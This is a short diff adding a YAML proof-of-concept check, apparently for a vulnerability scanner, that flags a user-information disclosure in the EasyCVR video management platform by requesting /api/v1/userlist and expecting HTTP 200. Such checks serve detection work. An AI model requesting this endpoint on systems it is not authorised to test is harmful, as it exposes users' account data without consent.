@@ -1,0 +1,3 @@
+name: "EasyCVR 视频管理平台存在用户信息泄露"
+poc: "/api/v1/userlist"
+status_code: 200
